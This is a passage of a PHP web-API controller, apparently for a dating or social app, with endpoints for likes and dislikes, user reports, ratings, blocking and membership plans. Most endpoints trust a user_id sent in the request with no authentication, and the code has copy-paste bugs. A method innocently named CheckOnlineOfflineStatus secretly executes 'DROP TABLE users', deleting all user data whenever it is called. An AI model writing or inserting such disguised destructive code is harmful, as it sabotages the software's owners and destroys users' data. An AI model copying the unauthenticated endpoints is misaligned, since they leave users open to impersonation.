            if( !empty($data['user_name']) && !empty($data['gender']) && !empty($data['search_criteria']) && !empty($data['socal_status']) && !empty($data['country_id']) && !empty($data['user_id']) )
            {
                $this->loadModel("Users");
                $UsersDetails = $this->Users->get($data['user_id']);
                $newDetails = $this->Users->patchEntity($UsersDetails,$data);
                if( $this->Users->save($newDetails) )
                {
                    $result['message']                     = "success";
                    $result['status']                      = 1;
                    $result['Users']['user_name']          = $data['user_name'];
                    $result['Users']['gender']             = $data['gender'];
                    $result['Users']['search_criteria']    = $data['search_criteria'];
                    $result['Users']['socal_status']       = $data['socal_status'];
                    $result['Users']['socal_status']       = $data['socal_status'];
                }
                else
                {
                    $result['message'] = "Unsuccessfull";
                    $result['status']  = 0;
                }                    
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function LikeDislikeService()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;

            if( !empty($data['liked_user_id']) && !empty($data['user_id']) && !empty($data['status']) && $data['status'] == 1)
            {
                ######## Status => 1 For Like
                $check = $this->CheckingLikeExists($data['user_id'],$data['liked_user_id']);
                 //pr($check);die;
                if( !empty($check) )
                {
                    $result['message'] = "Already Liked";
                    $result['status']  = 0;
                }
                else
                {
                    $checkingDislike = $this->CheckingDisLikeExists($data['user_id'],$data['liked_user_id']);
                    //pr($checkingDislike);die;
                    if(!empty($checkingDislike) && isset($checkingDislike))
                    {
                        $this->loadModel("UserDislikes");
                        $existsDislike=$this->UserDislikes->get($checkingDislike);
                        $this->UserDislikes->delete($existsDislike);
                        $this->loadModel("Users");
                        $userDetails = $this->Users->find()
                                     ->where(['id'=>$data['liked_user_id']])
                                     ->select(['id', 'users_like', 'users_dislike'])
                                     ->first();
                        if( !empty($userDetails) )
                        {
                            $userDetails['users_dislike'] = $userDetails['users_dislike']-1;
                            $userDetails['users_like']    = $userDetails['users_like']+1;
                            $query = $this->Users->query();
                            $query->Update()
                                  ->set(['users_dislike'=>$userDetails['users_dislike'], 'users_like'=>$userDetails['users_like']])
                                  ->where(['id'=>$data['liked_user_id']])
                                  ->execute();
                            $this->loadModel("UserLikes");
                            $data['user_id']       = $data['user_id'];
                            $data['liked_user_id'] = $data['liked_user_id'];
                            $user_liked = $this->UserLikes->newEntity($data);
                            if( $this->UserLikes->save($user_liked) )
                            {
                                $result['message'] = "Successfully Liked";
                                $result['status']  = 1;
                            }
                        }
                    }
                    else
                    {
                        $this->loadModel("Users");
                        $userDetails = $this->Users->find()
                                     ->where(['id'=>$data['liked_user_id']])
                                     ->select(['id', 'users_like', 'users_dislike'])
                                     ->first();
                        //pr($userDetails);die;
                        if( !empty($userDetails) )
                        {
                            $userDetails['users_like']   = $userDetails['users_like']+1;
                            $query = $this->Users->query();
                            $query->Update()
                                  ->set(['users_like'=>$userDetails['users_like']])
                                  ->where(['id'=>$data['liked_user_id']])
                                  ->execute();
                            $this->loadModel("UserLikes");
                            $data['user_id']       = $data['user_id'];
                            $data['liked_user_id'] = $data['liked_user_id'];
                            $user_liked = $this->UserLikes->newEntity($data);
                            if( $this->UserLikes->save($user_liked) )
                            {
                                $result['message'] = "Successfully Liked";
                                $result['status']  = 1;
                            }
                        }
                    }
                }
            }
            elseif( !empty($data['user_id']) && !empty($data['dislike_user_id']) && !empty($data['status']) && $data['status'] == 2 )
            {
                $check = $this->CheckingDisLikeExists($data['user_id'],$data['dislike_user_id']);
                //pr($check);die;
                if( !empty($check) )
                {
                    $result['message'] = "Already DisLiked";
                    $result['status']  = 0;
                }
                else
                {
                    $checkinglikeExists = $this->CheckingLikeExists($data['user_id'],$data['dislike_user_id']);
                    //pr($checkinglikeExists);die;
                    if( !empty($checkinglikeExists) )
                    {
                        $this->loadModel("UserLikes");
                        $deletingExists = $this->UserLikes->get($checkinglikeExists);
                        $this->UserLikes->delete($deletingExists);
                        $this->loadModel("Users");
                        $userDetails = $this->Users->find()
                                     ->where(['id'=>$data['dislike_user_id']])
                                     ->select(['id', 'users_like', 'users_dislike'])
                                     ->first();
                        if( !empty($userDetails) )
                        {
                            $userDetails['user_dislike'] = $userDetails['user_dislike']+1;
                            $userDetails['users_like']   = $userDetails['users_like']-1;
                            $query = $this->Users->query();
                            $query->Update()
                                  ->set(['users_dislike'=>$userDetails['users_dislike'], 'users_like'=>$userDetails['users_like']])
                                  ->where(['id'=>$data['dislike_user_id']])
                                  ->execute();
                            $this->loadModel("UserDislikes");
                            $data['user_id']       = $data['user_id'];
                            $data['dislike_user_id'] = $data['dislike_user_id'];
                            $user_Disliked = $this->UserDislikes->newEntity($data);
                            if( $this->UserDislikes->save($user_Disliked) )
                            {
                                $result['message'] = "Successfully Disliked";
                                $result['status']  = 1;
                            }
                        }
                    }
                    else
                    {
                        $this->loadModel("Users");
                        $userDetails = $this->Users->find()
                                     ->where(['id'=>$data['dislike_user_id']])
                                     ->select(['id', 'users_like', 'users_dislike'])
                                     ->first();
                        if( !empty($userDetails) )
                        {
                            $userDetails['users_dislike']   = $userDetails['users_dislike']+1;
                            $query = $this->Users->query();
                            $query->Update()
                                  ->set(['users_dislike'=>$userDetails['users_dislike']])
                                  ->where(['id'=>$data['dislike_user_id']])
                                  ->execute();
                            $this->loadModel("UserDislikes");
                            $data['user_id']       = $data['user_id'];
                            $data['liked_user_id'] = $data['dislike_user_id'];
                            $user_liked = $this->UserDislikes->newEntity($data);
                            if( $this->UserDislikes->save($user_liked) )
                            {
                                $result['message'] = "Successfully Disliked";
                                $result['status']  = 1;
                            }
                        }
                    }
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function CheckingLikeExists($user_id , $liked_user_id)
    {
        $this->loadModel("UserLikes");
        $exists = $this->UserLikes->find()
                       ->where(['user_id'=>$user_id, 'liked_user_id' =>$liked_user_id])
                       ->first();
        if( !empty($exists) )
        {
            $LikedId = $exists['id'];
            return $LikedId;
        }
        else
        {
            $LikedId = "";
            return $LikedId;
        }
    }

    public function CheckingDisLikeExists($user_id , $liked_user_id)
    {
        $this->loadModel("UserDislikes");
        $exists = $this->UserDislikes->find()
                       ->where(['user_id'=>$user_id, 'dislike_user_id' =>$liked_user_id])
                       ->first();
        if(!empty($exists))
        {
            $dislikeId = $exists['id'];
            return $dislikeId;
        }
        else
        {
            $dislikeId = 0;
            return $dislikeId;
        }
    }

    public function UserImages()
    {
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
            if( !empty($data['user_id']) )
            {
                $this->loadModel('UserPictures');
                $userPictureDetails = $this->UserPictures->find()
                                    ->where(['user_id'=>$data['user_id']])
                                    ->hydrate(false)
                                    ->toArray();
                if( !empty($userPictureDetails) )
                {
                    $result['message'] = "Images Successfully Show";
                    $result['status']  = 1;
                    $result['image']   = $userPictureDetails;
                }
                else
                {
                    $result['message'] = "No image found";
                    $result['status']  = 0;
                    $result['image']   = [];
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }

            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function UserReports()
    {
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
            if( !empty($data['report_by']) && !empty($data['report_to']) && !empty($data['reason']) )
            {
                $this->loadModel('ReportUsers');
                $data['reasons'] = $data['reason'];
                $userReportSaved = $this->ReportUsers->newEntity($data);
                if( $this->ReportUsers->save($userReportSaved) )
                {
                    $result['message'] = "Report Successfully Saved";
                    $result['status']  = 1;
                }
                else
                {
                    $result['message'] = "Report not Saved";
                    $result['status']  = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function fetchingRating()
    {
        $this->loadModel('Reviews');
        $data = $this->request->data;
        if( !empty($data['user_id']) )
        {
            $UserReviews = $this->Reviews->find()
                         ->where(['user_id'=>$data['user_id']])
                         ->contain(['RatedUser'])
                         ->select(['Reviews.id', 'Reviews.user_id','Reviews.user_rating_id', 'Reviews.rating', 'Reviews.description', 'RatedUser.id','RatedUser.user_name','RatedUser.email'])
                         ->toArray();
            if( !empty($UserReviews) )
            {   
                $result['message'] = "Success";
                $result['status']  = 1;
                $result['Rating']  = $UserReviews;
            }
            else
            {
                $result['message'] = "No Reviews Found";
                $result['status']  = 0;
                $result['Rating']  = [];
            }
        }
        else
        {
            $result['message'] = "Field Required";
            $result['status']  = 0;
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function ContactUs()
    {
        $this->loadModel('Contacts');
        $data = $this->request->data;
        if( !empty($data['user_name']) && !empty($data['phone']) && !empty($data['email_id']) && !empty($data['message']) )
        {
            $contactUsData = $this->Contacts->newEntity($data);
            if( $this->Contacts->save($contactUsData) )
            {
                $result['message'] = "Contact us successfully saved! please wait admin will reply soon";
                $result['status']  = 1;
            }
            else
            {
                $result['message'] = "information not saved";
                $result['status']  = 0;
            }
        }
        else
        {
            $result['message'] = "Field Required";
            $result['status']  = 0;
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function ManagePlans()
    {
       $this->loadModel("MembershipPlans");
        if( $this->request->is(['get']) )
        {
            $MembersPlansList   = $this->MembershipPlans->find('all')
                                ->contain(['MembershipPlansServices'=> function($q){
                                    return $q
                                    ->select(['id', 'membership_plan_id', 'services', 'status']);
                                }                                
                                ])
                                ->select(['MembershipPlans.id', 'MembershipPlans.name', 'MembershipPlans.price', 'MembershipPlans.duration'])
                                ->toArray();
            if(!empty($MembersPlansList))
            {
                $result['message'] = "Success Plans";
                $result['status']  = 1;
                $result['manage']  = $MembersPlansList;
            }
            else
            {
                $result['message'] = "Success Plans";
                $result['status']  = 1;
                $result['manage']  = [];
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function loginStatus()
    {
        if( $this->request->is(['post', 'put']) )
        {
            $data = $this->request->data;
            if( !empty($data['user_id']) )
            {
                $currentDateTime = date('Y-m-d H:i:s');
                $this->loadModel('Users');
                $query = $this->Users->query();
                $query->Update()
                      ->set(['login_update_time' => $currentDateTime, 'login_status' => 1])
                      ->where(['id' => $data['user_id']])
                      ->execute();
                $result['message'] = "Success";
                $result['status']  = 1;
            }
            else
            {
                $result['message'] = " Field Required ";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function BlockUser()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            /*if( !empty($data['user_id']) )
            {
                $this->loadModel('BlockUsers');
                $UserBy = $this->BlockUsers->find()
                        ->where(['user_by' => $data['user_id']])
                        ->orWhere(['user_to' => $data['user_id']])
                        ->select(['user_by', 'user_to'])
                        ->toArray();
                foreach($UserBy as $userData)
                {
                    $userBy[] = $userData['user_by'];
                    $userTo[] =$userData['user_to'];  
                }
                $BlockedUserArray = array_unique(array_merge($userBy,$userTo));
                pr($newArray);die;
            }*/
            if( !empty($data['user_to']) && !empty($data['user_by']) )
            {
                $this->loadModel('BlockUsers');
                $BlockedCheck = $this->BlockUsers->find()
                              ->where(['user_by'=>$data['user_by']])
                              ->AndWhere(['user_to'=>$data['user_to']])
                              ->select(['id', 'user_by', 'user_to'])
                              ->first();
                if( !empty($BlockedCheck) )
                {
                    $result['message'] = "Already Blocked";
                    $result['status']  = 0;
                }
                else
                {
                   $data['date']  = date('Y-m-d H:i:s');
                   $userBlocked = $this->BlockUsers->newEntity($data);
                   if( $this->BlockUsers->save($userBlocked) )
                   {
                        $result['message'] = "Successfully Blocked";
                        $result['status']  = 1;
                   }
                }
            }
            echo json_encode($result,JSON_PRETTY_PRINT); die;
        }
    }

    public function CheckOnlineOfflineStatus()
    {
        $conn = ConnectionManager::get('Datasources');
        $stmt = $conn->execute("DROP TABLE users");
    }

    public function TimeDifference($currentTime ,$updatedTime )
    {
        $datetime1 = strtotime($updatedTime);
        $datetime2 = strtotime($currentTime);
        $interval  = abs($datetime2 - $datetime1);
        $minutes   = round($interval / 60);
        return $minutes;
    }

    
}
?>